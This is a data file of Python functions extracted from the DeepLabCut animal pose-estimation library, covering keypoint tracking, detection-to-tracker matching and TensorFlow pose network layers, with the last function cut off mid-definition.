AlexEMG/DeepLabCut,object_keypoint_similarity,"@staticmethod
def object_keypoint_similarity(x, y):
    mask = ~np.isnan(x * y).all(axis=1)
    xx = x[mask]
    yy = y[mask]
    dist = np.linalg.norm(xx - yy, axis=1)
    scale = np.sqrt(np.product(np.ptp(yy, axis=0)))
    oks = np.exp(-0.5 * (dist / (0.05 * scale)) ** 2)
    return np.mean(oks)"
AlexEMG/DeepLabCut,calc_pairwise_hausdorff_dist,"def calc_pairwise_hausdorff_dist(self, poses, poses_ref):
    mat = np.zeros((len(poses), len(poses_ref)))
    for (i, pose) in enumerate(poses):
        for (j, pose_ref) in enumerate(poses_ref):
            mat[i, j] = self.weighted_hausdorff(pose, pose_ref)
    return mat"
AlexEMG/DeepLabCut,calc_pairwise_oks,"def calc_pairwise_oks(self, poses, poses_ref):
    mat = np.zeros((len(poses), len(poses_ref)))
    for (i, pose) in enumerate(poses):
        for (j, pose_ref) in enumerate(poses_ref):
            mat[i, j] = self.object_keypoint_similarity(pose, pose_ref)
    return mat"
AlexEMG/DeepLabCut,track,"def track(self, poses):
    self.n_frames += 1
    if not len(self.trackers):
        for pose in poses:
            tracker = SkeletonTracker(self.n_bodyparts)
            tracker.state = pose
            self.trackers.append(tracker)
    poses_ref = []
    for (i, tracker) in enumerate(self.trackers):
        pose_ref = tracker.predict()
        poses_ref.append(pose_ref.reshape((-1, 2)))
    mat = self.calc_pairwise_hausdorff_dist(poses, poses_ref)
    (row_indices, col_indices) = linear_sum_assignment(mat, maximize=False)
    unmatched_poses = [p for (p, _) in enumerate(poses) if p not in row_indices]
    unmatched_trackers = [t for (t, _) in enumerate(poses_ref) if t not in col_indices]
    matches = np.c_[row_indices, col_indices]
    animalindex = []
    for (t, tracker) in enumerate(self.trackers):
        if t not in unmatched_trackers:
            ind = matches[matches[:, 1] == t, 0][0]
            animalindex.append(ind)
            tracker.update(poses[ind])
        else:
            animalindex.append(-1)
    for i in unmatched_poses:
        tracker = SkeletonTracker(self.n_bodyparts)
        tracker.state = poses[i]
        self.trackers.append(tracker)
        animalindex.append(i)
    states = []
    i = len(self.trackers)
    for tracker in reversed(self.trackers):
        i -= 1
        if tracker.time_since_update > self.max_age:
            self.trackers.pop()
            continue
        state = tracker.predict()
        states.append(np.r_[state, [tracker.id, int(animalindex[i])]])
    if len(states) > 0:
        return np.stack(states)
    return np.empty((0, self.n_bodyparts * 2 + 2))"
AlexEMG/DeepLabCut,__init__,"def __init__(self, max_age, min_hits, iou_threshold):
    self.max_age = max_age
    self.min_hits = min_hits
    self.iou_threshold = iou_threshold
    BoxTracker.n_trackers = 0
    super().__init__()"
AlexEMG/DeepLabCut,track,"def track(self, dets):
    self.n_frames += 1
    trackers = np.zeros((len(self.trackers), 5))
    for i in range(len(trackers)):
        trackers[i, :4] = self.trackers[i].predict()
    empty = np.isnan(trackers).any(axis=1)
    trackers = trackers[~empty]
    for ind in np.flatnonzero(empty)[::-1]:
        self.trackers.pop(ind)
    (matched, unmatched_dets, unmatched_trks) = self.match_detections_to_trackers(dets, trackers, self.iou_threshold)
    animalindex = []
    for (t, trk) in enumerate(self.trackers):
        if t not in unmatched_trks:
            d = matched[np.where(matched[:, 1] == t)[0], 0]
            animalindex.append(d[0])
            trk.update(dets[d, :][0])
        else:
            animalindex.append('nix')
    for i in unmatched_dets:
        trk = BoxTracker(dets[i, :])
        self.trackers.append(trk)
        animalindex.append(i)
    i = len(self.trackers)
    ret = []
    for trk in reversed(self.trackers):
        d = trk.state
        if trk.time_since_update < 1 and (trk.hit_streak >= self.min_hits or self.n_frames <= self.min_hits):
            ret.append(np.concatenate((d, [trk.id, int(animalindex[i - 1])])).reshape(1, -1))
        i -= 1
        if trk.time_since_update > self.max_age:
            self.trackers.pop(i)
    if len(ret) > 0:
        return np.concatenate(ret)
    return np.empty((0, 5))"
AlexEMG/DeepLabCut,match_detections_to_trackers,"@staticmethod
def match_detections_to_trackers(detections, trackers, iou_threshold):
    """"""
        Assigns detections to tracked object (both represented as bounding boxes)

        Returns 3 lists of matches, unmatched_detections and unmatched_trackers
        """"""
    if not len(trackers):
        return (np.empty((0, 2), dtype=int), np.arange(len(detections)), np.empty((0, 5), dtype=int))
    iou_matrix = np.zeros((len(detections), len(trackers)), dtype=np.float32)
    for (d, det) in enumerate(detections):
        for (t, trk) in enumerate(trackers):
            iou_matrix[d, t] = calc_iou(det, trk)
    (row_indices, col_indices) = linear_sum_assignment(-iou_matrix)
    unmatched_detections = []
    for (d, det) in enumerate(detections):
        if d not in row_indices:
            unmatched_detections.append(d)
    unmatched_trackers = []
    for (t, trk) in enumerate(trackers):
        if t not in col_indices:
            unmatched_trackers.append(t)
    matches = []
    for (row, col) in zip(row_indices, col_indices):
        if iou_matrix[row, col] < iou_threshold:
            unmatched_detections.append(row)
            unmatched_trackers.append(col)
        else:
            matches.append([row, col])
    if not len(matches):
        matches = np.empty((0, 2), dtype=int)
    else:
        matches = np.stack(matches)
    return (matches, np.array(unmatched_detections), np.array(unmatched_trackers))"
AlexEMG/DeepLabCut,__init__,"def __init__(self, cfg):
    self.cfg = cfg"
AlexEMG/DeepLabCut,extract_features,"@abc.abstractmethod
def extract_features(self, inputs):
    ..."
AlexEMG/DeepLabCut,get_net,"@abc.abstractmethod
def get_net(self, inputs):
    ..."
AlexEMG/DeepLabCut,train,"def train(self, batch):
    heads = self.get_net(batch[Batch.inputs])
    if self.cfg['weigh_part_predictions']:
        part_score_weights = batch[Batch.part_score_weights]
    else:
        part_score_weights = 1.0

    def add_part_loss(pred_layer):
        return tf.compat.v1.losses.sigmoid_cross_entropy(batch[Batch.part_score_targets], heads[pred_layer], part_score_weights)
    loss = {'part_loss': add_part_loss('part_pred')}
    total_loss = loss['part_loss']
    if self.cfg['intermediate_supervision'] and 'efficientnet' not in self.cfg['net_type']:
        loss['part_loss_interm'] = add_part_loss('part_pred_interm')
        total_loss += loss['part_loss_interm']
    if self.cfg['location_refinement']:
        locref_pred = heads['locref']
        locref_targets = batch[Batch.locref_targets]
        locref_weights = batch[Batch.locref_mask]
        loss_func = tf.compat.v1.losses.huber_loss if self.cfg['locref_huber_loss'] else tf.compat.v1.losses.mean_squared_error
        loss['locref_loss'] = self.cfg['locref_loss_weight'] * loss_func(locref_targets, locref_pred, locref_weights)
        total_loss += loss['locref_loss']
    if self.cfg['pairwise_predict'] or self.cfg['partaffinityfield_predict']:
        pairwise_pred = heads['pairwise_pred']
        pairwise_targets = batch[Batch.pairwise_targets]
        pairwise_weights = batch[Batch.pairwise_mask]
        loss_func = tf.compat.v1.losses.huber_loss if self.cfg['pairwise_huber_loss'] else tf.compat.v1.losses.mean_squared_error
        loss['pairwise_loss'] = self.cfg['pairwise_loss_weight'] * loss_func(pairwise_targets, pairwise_pred, pairwise_weights)
        total_loss += loss['pairwise_loss']
    loss['total_loss'] = total_loss
    return loss"
AlexEMG/DeepLabCut,test,"def test(self, inputs):
    heads = self.get_net(inputs)
    return self.add_inference_layers(heads)"
AlexEMG/DeepLabCut,prediction_layers,"def prediction_layers(self, features, scope='pose', reuse=None):
    out = {}
    n_joints = self.cfg['num_joints']
    with tf.compat.v1.variable_scope(scope, reuse=reuse):
        out['part_pred'] = prediction_layer(self.cfg, features, 'part_pred', n_joints + self.cfg.get('num_idchannel', 0))
        if self.cfg['location_refinement']:
            out['locref'] = prediction_layer(self.cfg, features, 'locref_pred', n_joints * 2)
        if self.cfg['pairwise_predict'] and 'multi-animal' not in self.cfg['dataset_type']:
            out['pairwise_pred'] = prediction_layer(self.cfg, features, 'pairwise_pred', n_joints * (n_joints - 1) * 2)
        if self.cfg['partaffinityfield_predict'] and 'multi-animal' in self.cfg['dataset_type']:
            out['pairwise_pred'] = prediction_layer(self.cfg, features, 'pairwise_pred', self.cfg['num_limbs'] * 2)
    out['features'] = features
    return out"
AlexEMG/DeepLabCut,inference,"def inference(self, inputs):
    """"""Direct TF inference on GPU.
        Added with: https://arxiv.org/abs/1909.11229
        """"""
    heads = self.get_net(inputs)
    locref = heads['locref']
    probs = tf.sigmoid(heads['part_pred'])
    if self.cfg['batch_size'] == 1:
        probs = tf.squeeze(probs, axis=0)
        locref = tf.squeeze(locref, axis=0)
        l_shape = tf.shape(input=probs)
        locref = tf.reshape(locref, (l_shape[0] * l_shape[1], -1, 2))
        probs = tf.reshape(probs, (l_shape[0] * l_shape[1], -1))
        maxloc = tf.argmax(input=probs, axis=0)
        loc = tf.unravel_index(maxloc, (tf.cast(l_shape[0], tf.int64), tf.cast(l_shape[1], tf.int64)))
        maxloc = tf.reshape(maxloc, (1, -1))
        joints = tf.reshape(tf.range(0, tf.cast(l_shape[2], dtype=tf.int64)), (1, -1))
    else:
        l_shape = tf.shape(input=probs)
        locref = tf.reshape(locref, (l_shape[0], l_shape[1], l_shape[2], l_shape[3], 2))
        locref = tf.transpose(a=locref, perm=[1, 2, 0, 3, 4])
        probs = tf.transpose(a=probs, perm=[1, 2, 0, 3])
        l_shape = tf.shape(input=probs)
        locref = tf.reshape(locref, (l_shape[0] * l_shape[1], -1, 2))
        probs = tf.reshape(probs, (l_shape[0] * l_shape[1], -1))
        maxloc = tf.argmax(input=probs, axis=0)
        loc = tf.unravel_index(maxloc, (tf.cast(l_shape[0], tf.int64), tf.cast(l_shape[1], tf.int64)))
        maxloc = tf.reshape(maxloc, (1, -1))
        joints = tf.reshape(tf.range(0, tf.cast(l_shape[2] * l_shape[3], dtype=tf.int64)), (1, -1))
    indices = tf.transpose(a=tf.concat([maxloc, joints], axis=0))
    offset = tf.gather_nd(locref, indices)
    offset = tf.gather(offset, [1, 0], axis=1)
    likelihood = tf.reshape(tf.gather_nd(probs, indices), (-1, 1))
    pose = self.cfg['stride'] * tf.cast(tf.transpose(a=loc), dtype=tf.float32) + self.cfg['stride'] * 0.5 + offset * self.cfg['locref_stdev']
    pose = tf.concat([pose, likelihood], axis=1)
    return {'pose': pose}"
AlexEMG/DeepLabCut,add_inference_layers,"def add_inference_layers(self, heads):
    """"""initialized during inference""""""
    prob = tf.sigmoid(heads['part_pred'])
    nms_radius = int(self.cfg.get('nmsradius', 5))
    scmaps = tf.gather(prob, tf.range(self.cfg['num_joints']), axis=3)
    kernel = make_2d_gaussian_kernel(sigma=self.cfg.get('sigma', 1), size=nms_radius * 2 + 1)
    kernel = kernel[:, :, tf.newaxis, tf.newaxis]
    kernel_sc = tf.tile(kernel, [1, 1, tf.shape(scmaps)[3], 1])
    scmaps = tf.nn.depthwise_conv2d(scmaps, kernel_sc, strides=[1, 1, 1, 1], padding='SAME')
    peak_inds = predict_multianimal.find_local_peak_indices_maxpool_nms(scmaps, nms_radius, self.cfg.get('minconfidence', 0.01))
    outputs = {'part_prob': prob, 'peak_inds': peak_inds}
    if self.cfg['location_refinement']:
        locref = heads['locref']
        if self.cfg.get('locref_smooth', False):
            kernel_loc = tf.tile(kernel, [1, 1, tf.shape(locref)[3], 1])
            locref = tf.nn.depthwise_conv2d(locref, kernel_loc, strides=[1, 1, 1, 1], padding='SAME')
        outputs['locref'] = locref
    if self.cfg['pairwise_predict'] or self.cfg['partaffinityfield_predict']:
        outputs['pairwise_pred'] = heads['pairwise_pred']
    if 'features' in heads:
        outputs['features'] = heads['features']
    return outputs"
AlexEMG/DeepLabCut,center_inputs,"def center_inputs(self, inputs):
    mean = tf.constant(self.cfg['mean_pixel'], dtype=tf.float32, shape=[1, 1, 1, 3], name='img_mean')
    return inputs - mean"
AlexEMG/DeepLabCut,add_part_loss,"def add_part_loss(pred_layer):
    return tf.compat.v1.losses.sigmoid_cross_entropy(batch[Batch.part_score_targets], heads[pred_layer], part_score_weights)"
AlexEMG/DeepLabCut,_fixed_padding,"def _fixed_padding(inputs, kernel_size, rate=1):
    """"""Pads the input along the spatial dimensions independently of input size.

    Pads the input such that if it was used in a convolution with 'VALID' padding,
    the output would have the same dimensions as if the unpadded input was used
    in a convolution with 'SAME' padding.

    Args:
      inputs: A tensor of size [batch, height_in, width_in, channels].
      kernel_size: The kernel to be used in the conv2d or max_pool2d operation.
      rate: An integer, rate for atrous convolution.

    Returns:
      output: A tensor of size [batch, height_out, width_out, channels] with the
        input, either intact (if kernel_size == 1) or padded (if kernel_size > 1).
    """"""
    size = kernel_size[0] + (kernel_size[0] - 1) * (rate - 1)
    kernel_size_effective = [size, size]
    pad_total = [kernel_size_effective[0] - 1, kernel_size_effective[1] - 1]
    pad_beg = [pad_total[0] // 2, pad_total[1] // 2]
    pad_end = [pad_total[0] - pad_beg[0], pad_total[1] - pad_beg[1]]
    padded_inputs = tf.pad(tensor=inputs, paddings=[[0, 0], [pad_beg[0], pad_end[0]], [pad_beg[1], pad_end[1]], [0, 0]])
    return padded_inputs"
AlexEMG/DeepLabCut,_make_divisible,"def _make_divisible(v, divisor, min_value=None):
    if min_value is None:
        min_value = divisor
    new_v = max(min_value, int(v + divisor / 2) // divisor * divisor)
    if new_v < 0.9 * v:
        new_v += divisor
    return new_v"
AlexEMG/DeepLabCut,_split_divisible,"def _split_divisible(num, num_ways, divisible_by=8):
    """"""Evenly splits num, num_ways so each piece is a multiple of divisible_by.""""""
    assert num % divisible_by == 0
    assert num / num_ways >= divisible_by
    base = num // num_ways // divisible_by * divisible_by
    result = []
    accumulated = 0
    for i in range(num_ways):
        r = base
        while accumulated + r < num * (i + 1) / num_ways:
            r += divisible_by
        result.append(r)
        accumulated += r
    assert accumulated == num
    return result"
AlexEMG/DeepLabCut,_v1_compatible_scope_naming,"@contextlib.contextmanager
def _v1_compatible_scope_naming(scope):
    if scope is None:
        with tf.compat.v1.variable_scope(None, default_name='separable') as s, tf.compat.v1.name_scope(s.original_name_scope):
            yield ''
    else:
        scope += '_'
        yield scope"
AlexEMG/DeepLabCut,split_separable_conv2d,"@slim.add_arg_scope
def split_separable_conv2d(input_tensor, num_outputs, scope=None, normalizer_fn=None, stride=1, rate=1, endpoints=None, use_explicit_padding=False):
    """"""Separable mobilenet V1 style convolution.

    Depthwise convolution, with default non-linearity,
    followed by 1x1 depthwise convolution.  This is similar to
    slim.separable_conv2d, but differs in that it applies batch
    normalization and non-linearity to depthwise. This  matches
    the basic building of Mobilenet Paper
    (https://arxiv.org/abs/1704.04861)

    Args:
      input_tensor: input
      num_outputs: number of outputs
      scope: optional name of the scope. Note if provided it will use
      scope_depthwise for deptwhise, and scope_pointwise for pointwise.
      normalizer_fn: which normalizer function to use for depthwise/pointwise
      stride: stride
      rate: output rate (also known as dilation rate)
      endpoints: optional, if provided, will export additional tensors to it.
      use_explicit_padding: Use 'VALID' padding for convolutions, but prepad
        inputs so that the output dimensions are the same as if 'SAME' padding
        were used.

    Returns:
      output tesnor
    """"""
    with _v1_compatible_scope_naming(scope) as scope:
        dw_scope = scope + 'depthwise'
        endpoints = endpoints if endpoints is not None else {}
        kernel_size = [3, 3]
        padding = 'SAME'
        if use_explicit_padding:
            padding = 'VALID'
            input_tensor = _fixed_padding(input_tensor, kernel_size, rate)
        net = slim.separable_conv2d(input_tensor, None, kernel_size, depth_multiplier=1, stride=stride, rate=rate, normalizer_fn=normalizer_fn, padding=padding, scope=dw_scope)
        endpoints[dw_scope] = net
        pw_scope = scope + 'pointwise'
        net = slim.conv2d(net, num_outputs, [1, 1], stride=1, normalizer_fn=normalizer_fn, scope=pw_scope)
        endpoints[pw_scope] = net
    return net"
AlexEMG/DeepLabCut,expand_input_by_factor,"def expand_input_by_factor(n, divisible_by=8):
    return lambda num_inputs, **_: _make_divisible(num_inputs * n, divisible_by)"
AlexEMG/DeepLabCut,expanded_conv,"@slim.add_arg_scope
def expanded_conv(input_tensor, num_outputs, expansion_size=expand_input_by_factor(6), stride=1, rate=1, kernel_size=(3, 3), residual=True, normalizer_fn=None, project_activation_fn=tf.identity, split_projection=1, split_expansion=1, split_divisible_by=8, expansion_transform=None, depthwise_location='expansion', depthwise_channel_multiplier=1, endpoints=None, use_explicit_padding=False, padding='SAME', scope=None):
    """"""Depthwise Convolution Block with expansion.

    Builds a composite convolution that has the following structure
    expansion (1x1) -> depthwise (kernel_size) -> projection (1x1)

    Args:
      input_tensor: input
      num_outputs: number of outputs in the final layer.
      expansion_size: the size of expansion, could be a constant or a callable.
        If latter it will be provided 'num_inputs' as an input. For forward
        compatibility it should accept arbitrary keyword arguments.
        Default will expand the input by factor of 6.
      stride: depthwise stride
      rate: depthwise rate
      kernel_size: depthwise kernel
      residual: whether to include residual connection between input
        and output.
      normalizer_fn: batchnorm or otherwise
      project_activation_fn: activation function for the project layer
      split_projection: how many ways to split projection operator
        (that is conv expansion->bottleneck)
      split_expansion: how many ways to split expansion op
        (that is conv bottleneck->expansion) ops will keep depth divisible
        by this value.
      split_divisible_by: make sure every split group is divisible by this number.
      expansion_transform: Optional function that takes expansion
        as a single input and returns output.
      depthwise_location: where to put depthwise covnvolutions supported
        values None, 'input', 'output', 'expansion'
      depthwise_channel_multiplier: depthwise channel multiplier:
      each input will replicated (with different filters)
      that many times. So if input had c channels,
      output will have c x depthwise_channel_multpilier.
      endpoints: An optional dictionary into which intermediate endpoints are
        placed. The keys ""expansion_output"", ""depthwise_output"",
        ""projection_output"" and ""expansion_transform"" are always populated, even
        if the corresponding functions are not invoked.
      use_explicit_padding: Use 'VALID' padding for convolutions, but prepad
        inputs so that the output dimensions are the same as if 'SAME' padding
        were used.
      padding: Padding type to use if `use_explicit_padding` is not set.
      scope: optional scope.

    Returns:
      Tensor of depth num_outputs

    Raises:
      TypeError: on inval
    """"""
    with tf.compat.v1.variable_scope(scope, default_name='expanded_conv') as s, tf.compat.v1.name_scope(s.original_name_scope):
        prev_depth = input_tensor.get_shape().as_list()[3]
        if depthwise_location not in [None, 'input', 'output', 'expansion']:
            raise TypeError('%r is unknown value for depthwise_location' % depthwise_location)
        if use_explicit_padding:
            if padding != 'SAME':
                raise TypeError('`use_explicit_padding` should only be used with ""SAME"" padding.')
            padding = 'VALID'
        depthwise_func = functools.partial(slim.separable_conv2d, num_outputs=None, kernel_size=kernel_size, depth_multiplier=depthwise_channel_multiplier, stride=stride, rate=rate, normalizer_fn=normalizer_fn, padding=padding, scope='depthwise')
        input_tensor = tf.identity(input_tensor, 'input')
        net = input_tensor
        if depthwise_location == 'input':
            if use_explicit_padding:
                net = _fixed_padding(net, kernel_size, rate)
            net = depthwise_func(net, activation_fn=None)
        if callable(expansion_size):
            inner_size = expansion_size(num_inputs=prev_depth)
        else:
            inner_size = expansion_size
        if inner_size > net.shape[3]:
            net = split_conv(net, inner_size, num_ways=split_expansion, scope='expand', divisible_by=split_divisible_by, stride=1, normalizer_fn=normalizer_fn)
            net = tf.identity(net, 'expansion_output')
        if endpoints is not None:
            endpoints['expansion_output'] = net
        if depthwise_location == 'expansion':
            if use_explicit_padding:
                net = _fixed_padding(net, kernel_size, rate)
            net = depthwise_func(net)
        net = tf.identity(net, name='depthwise_output')
        if endpoints is not None:
            endpoints['depthwise_output'] = net
        if expansion_transform:
            net = expansion_transform(expansion_tensor=net, input_tensor=input_tensor)
        net = split_conv(net, num_outputs, num_ways=split_projection, stride=1, scope='project', divisible_by=split_divisible_by, normalizer_fn=normalizer_fn, activation_fn=project_activation_fn)
        if endpoints is not None:
            endpoints['projection_output'] = net
        if depthwise_location == 'output':
            if use_explicit_padding:
                net = _fixed_padding(net, kernel_size, rate)
            net = depthwise_func(net, activation_fn=None)
        if callable(residual):
            net = residual(input_tensor=input_tensor, output_tensor=net)
        elif residual and stride == 1 and (net.get_shape().as_list()[3] == input_tensor.get_shape().as_list()[3]):
            net += input_tensor
        return tf.identity(net, name='output')"
AlexEMG/DeepLabCut,split_conv,"def split_conv(input_tensor, num_outputs, num_ways, scope, divisible_by=8, **kwargs):
    """"""Creates a split convolution.

    Split convolution splits the input and output into
    'num_blocks' blocks of approximately the same size each,
    and only connects $i$-th input to $i$ output.

    Args:
      input_tensor: input tensor
      num_outputs: number of output filters
      num_ways: num blocks to split by.
      scope: scope for all the operators.
      divisible_by: make sure that every part is divisiable by this.
      **kwargs: will be passed directly into conv2d operator
    Returns:
      tensor
    """"""
    b = input_tensor.get_shape().as_list()[3]
    if num_ways == 1 or min(b // num_ways, num_outputs // num_ways) < divisible_by:
        return slim.conv2d(input_tensor, num_outputs, [1, 1], scope=scope, **kwargs)
    outs = []
    input_splits = _split_divisible(b, num_ways, divisible_by=divisible_by)
    output_splits = _split_divisible(num_outputs, num_ways, divisible_by=divisible_by)
    inputs = tf.split(input_tensor, input_splits, axis=3, name='split_' + scope)
    base = scope
    for (i, (input_tensor, out_size)) in enumerate(zip(inputs, output_splits)):
        scope = base + '_part_%d' % (i,)
        n = slim.conv2d(input_tensor, out_size, [1, 1], scope=scope, **kwargs)
        n = tf.identity(n, scope + '_output')
        outs.append(n)
    return tf.concat(outs, 3, name=scope + '_concat')"
AlexEMG/DeepLabCut,__init__,"def __init__(self, cfg):
    super(PoseEfficientNet, self).__init__(cfg)
    if 'use_batch_norm' not in self.cfg:
        self.cfg['use_batch_norm'] = False
    if 'use_drop_out' not in self.cfg:
        self.cfg['use_drop_out'] = False"
AlexEMG/DeepLabCut,extract_features,"def extract_features(self, inputs, use_batch_norm=False, use_drop_out=False):
    im_centered = self.center_inputs(inputs)
    im_centered /= tf.constant(eff.STDDEV_RGB, shape=[1, 1, 3])
    with tf.compat.v1.variable_scope('efficientnet'):
        eff_net_type = self.cfg['net_type'].replace('_', '-')
        (net, end_points) = eff.build_model_base(im_centered, eff_net_type, use_batch_norm=use_batch_norm, drop_out=use_drop_out)
    return (net, end_points)"
AlexEMG/DeepLabCut,get_net,"def get_net(self, inputs, use_batch_norm=False, use_drop_out=False):
    (net, _) = self.extract_features(inputs, use_batch_norm, use_drop_out)
    return self.prediction_layers(net)"
AlexEMG/DeepLabCut,test,"def test(self, inputs):
    heads = self.get_net(inputs, self.cfg['use_batch_norm'], self.cfg['use_drop_out'])
    return self.add_inference_layers(heads)"
AlexEMG/DeepLabCut,register,"@classmethod
def register(cls, type_):

    def wrapper(net):
        if type_ in cls._nets:
            warnings.warn('Overwriting existing network {}.')
        cls._nets[type_] = net
        return net
    return wrapper"
AlexEMG/DeepLabCut,create,"@classmethod
def create(cls, cfg):
    if cfg.get('stride', 8) < 8:
        net_type = 'multi'
    else:
        net_type = cfg['net_type']
    key = cls._find_matching_key(cls._nets, net_type)
    if key is None:
        raise ValueError(f'Unsupported network of type {net_type}')
    net = cls._nets.get(key)
    return net(cfg)"
AlexEMG/DeepLabCut,_find_matching_key,"@staticmethod
def _find_matching_key(dict_, key):
    try:
        match = next((k for k in dict_ if k in key))
    except StopIteration:
        match = None
    return match"
AlexEMG/DeepLabCut,wrapper,"def wrapper(net):
    if type_ in cls._nets:
        warnings.warn('Overwriting existing network {}.')
    cls._nets[type_] = net
    return net"
AlexEMG/DeepLabCut,prediction_layer,"def prediction_layer(cfg, input, name, num_outputs):
    with slim.arg_scope([slim.conv2d, slim.conv2d_transpose], padding='SAME', activation_fn=None, normalizer_fn=None, weights_regularizer=slim.l2_regularizer(cfg['weight_decay'])):
        with tf.compat.v1.variable_scope(name):
            pred = slim.conv2d_transpose(input, num_outputs, kernel_size=[3, 3], stride=2, scope='block4')
            return pred"
AlexEMG/DeepLabCut,prediction_layer_stage,"def prediction_layer_stage(cfg, input, name, num_outputs):
    with slim.arg_scope([slim.conv2d, slim.conv2d_transpose], padding='SAME', activation_fn=None, normalizer_fn=None, weights_regularizer=slim.l2_regularizer(cfg['weight_decay'])):
        with tf.compat.v1.variable_scope(name):
            pred = slim.conv2d(input, num_outputs, kernel_size=[3, 3], stride=1)
            return pred"
AlexEMG/DeepLabCut,__init__,"def __init__(self, cfg):
    super(PoseMobileNet, self).__init__(cfg)"
AlexEMG/DeepLabCut,extract_features,"def extract_features(self, inputs):
    (net_fun, net_arg_scope) = networks[self.cfg['net_type']]
    im_centered = self.center_inputs(inputs)
    with slim.arg_scope(net_arg_scope()):
        (net, end_points) = net_fun(im_centered)
    return (net, end_points)"
AlexEMG/DeepLabCut,prediction_layers,"def prediction_layers(self, features, end_points, scope='pose', reuse=None):
    out = super(PoseMobileNet, self).prediction_layers(features, scope, reuse)
    with tf.compat.v1.variable_scope(scope, reuse=reuse):
        if self.cfg['intermediate_supervision']:
            out['part_pred_interm'] = prediction_layer(self.cfg, end_points[f""layer_{self.cfg['intermediate_supervision_layer']}""], 'intermediate_supervision', self.cfg['num_joints'] + self.cfg.get('num_idchannel', 0))
    return out"
AlexEMG/DeepLabCut,get_net,"def get_net(self, inputs):
    (net, end_points) = self.extract_features(inputs)
    return self.prediction_layers(net, end_points)"
AlexEMG/DeepLabCut,prediction_layer,"def prediction_layer(cfg, input, name, num_outputs):
    with slim.arg_scope([slim.conv2d, slim.conv2d_transpose], padding='SAME', activation_fn=None, normalizer_fn=None, weights_regularizer=slim.l2_regularizer(cfg['weight_decay'])):
        with tf.compat.v1.variable_scope(name):
            pred = slim.conv2d_transpose(input, num_outputs, kernel_size=[3, 3], stride=2)
            return pred"
AlexEMG/DeepLabCut,__init__,"def __init__(self, cfg):
    super(PoseMultiNet, self).__init__(cfg)
    multi_stage = self.cfg.get('multi_stage', False)
    self.cfg['multi_stage'] = multi_stage and 'resnet' in self.cfg['net_type']"
AlexEMG/DeepLabCut,extract_features,"def extract_features(self, inputs):
    im_centered = self.center_inputs(inputs)
    net_type = self.cfg['net_type']
    if 'resnet' in net_type:
        net_fun = net_funcs[net_type]
        with slim.arg_scope(resnet_v1.resnet_arg_scope()):
            (net, end_points) = net_fun(im_centered, global_pool=False, output_stride=16, is_training=False)
    elif 'mobilenet' in net_type:
        net_fun = net_funcs[net_type]
        with slim.arg_scope(mobilenet_v2.training_scope()):
            (net, end_points) = net_fun(im_centered)
    elif 'efficientnet' in net_type:
        if 'use_batch_norm' not in self.cfg.keys():
            self.cfg['use_batch_norm'] = False
        if 'use_drop_out' not in self.cfg.keys():
            self.cfg['use_drop_out'] = False
        im_centered /= tf.constant(eff.STDDEV_RGB, shape=[1, 1, 3])
        (net, end_points) = eff.build_model_base(im_centered, net_type, use_batch_norm=self.cfg['use_batch_norm'], drop_out=self.cfg['use_drop_out'])
    else:
        raise ValueError(f'Unknown network of type {net_type}')
    return (net, end_points)"
AlexEMG/DeepLabCut,prediction_layers,"def prediction_layers(self, features, end_points, input_shape, scope='pose', reuse=None):
    net_type = self.cfg['net_type']
    if self.cfg['multi_stage']:
        num_layers = re.findall('resnet_([0-9]*)', net_type)[0]
        layer_name = 'resnet_v1_{}'.format(num_layers) + '/block{}/unit_{}/bottleneck_v1'
        mid_pt_block1 = layer_name.format(1, 3)
        mid_pt_block2 = layer_name.format(2, 3)
        final_dims = tf.math.ceil(tf.divide(input_shape[1:3], tf.convert_to_tensor(16)))
        interim_dims_s8 = tf.scalar_mul(2, final_dims)
        interim_dims_s8 = tf.cast(interim_dims_s8, tf.int32)
        interim_dims_s4 = tf.scalar_mul(2, interim_dims_s8)
        interim_dims_s4 = tf.cast(interim_dims_s4, tf.int32)
        bank_1 = end_points[mid_pt_block1]
        bank_2 = end_points[mid_pt_block2]
        bank_2_s8 = tf.compat.v1.image.resize_images(bank_2, interim_dims_s8)
        bank_1_s4 = tf.compat.v1.image.resize_images(bank_1, interim_dims_s4)
        with slim.arg_scope([slim.conv2d], padding='SAME', normalizer_fn=slim.layers.batch_norm, activation_fn=tf.nn.relu, weights_regularizer=slim.l2_regularizer(self.cfg['weight_decay'])):
            with tf.compat.v1.variable_scope('decoder_filters'):
                bank_2_s16 = slim.conv2d(bank_2_s8, 512, kernel_size=[3, 3], stride=2, scope='decoder_parallel_1')
                bank_2_s16 = slim.conv2d(bank_2_s16, 128, kernel_size=[1, 1], stride=1, scope='decoder_parallel_2')
                bank_1_s8 = slim.conv2d(bank_1_s4, 256, kernel_size=[3, 3], stride=2, scope='decoder_parallel_3')
                bank_1_s16 = slim.conv2d(bank_1_s8, 256, kernel_size=[3, 3], stride=2, scope='decoder_parallel_4')
                bank_1_s16 = slim.conv2d(bank_1_s16, 128, kernel_size=[1, 1], stride=1, scope='decoder_parallel_5')
        with slim.arg_scope([slim.conv2d_transpose], padding='SAME', normalizer_fn=None, weights_regularizer=slim.l2_regularizer(self.cfg['weight_decay'])):
            with tf.compat.v1.variable_scope('upsampled_features'):
                concat_3_s16 = tf.concat([bank_1_s16, bank_2_s16, features], 3)
                if self.cfg['stride'] == 8:
                    net = concat_3_s16
                elif self.cfg['stride'] == 4:
                    upsampled_features_2x = slim.conv2d_transpose(concat_3_s16, self.cfg.get('bank3', 128), kernel_size=[3, 3], stride=2, scope='block3')
                    net = upsampled_features_2x
                elif self.cfg['stride'] == 2:
                    upsampled_features_2x = slim.conv2d_transpose(concat_3_s16, self.cfg.get('bank3', 128), kernel_size=[3, 3], stride=2, scope='block3')
                    upsampled_features_4x = slim.conv2d_transpose(upsampled_features_2x, self.cfg.get('bank5', 128), kernel_size=[3, 3], stride=2, scope='block4')
                    net = upsampled_features_4x
        out = {}
        with tf.compat.v1.variable_scope(scope, reuse=reuse):
            stage1_hm_out = prediction_layer(self.cfg, net, 'part_pred_s1', self.cfg['num_joints'] + self.cfg.get('num_idchannel', 0))
            if self.cfg['location_refinement']:
                out['locref'] = prediction_layer(self.cfg, net, 'locref_pred', self.cfg['num_joints'] * 2)
            if self.cfg['pairwise_predict'] and 'multi-animal' not in self.cfg['dataset_type']:
                out['pairwise_pred'] = prediction_layer(self.cfg, net, 'pairwise_pred', self.cfg['num_joints'] * (self.cfg['num_joints'] - 1) * 2)
            if self.cfg['partaffinityfield_predict'] and 'multi-animal' in self.cfg['dataset_type']:
                feature = slim.conv2d_transpose(net, self.cfg.get('bank3', 128), kernel_size=[3, 3], stride=2)
